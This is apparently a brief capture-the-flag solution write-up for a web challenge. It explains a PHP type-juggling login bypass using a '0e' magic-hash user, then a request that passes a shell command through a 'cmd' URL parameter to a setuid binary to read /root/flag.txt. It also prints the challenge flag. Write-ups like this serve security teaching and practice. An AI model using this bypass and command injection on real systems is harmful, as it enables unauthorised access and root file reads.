# Solution
Find user with hash(sha256) starting "0e.." in `/users.json`. Login using the user email and password at `https://github.com/spaze/hashes/blob/master/sha256.md`

In `/files`, refresh button will post `/files?cmd=ls&token=120349812450928137590234857230945823745`. Found binary with setuid in `/home/minicms/file_JeqsmJ6xwH.bin`. Execute this `/files?cmd=/home/minicms/file_JeqsmJ6xwH.bin+"cat+/root/flag.txt"&token=120349812450928137590234857230945823745` to get the flag. 

Flag:`BtSCTF{juggl3_php_qu173_4444w3s0m3}`

Solved by: 0xad3n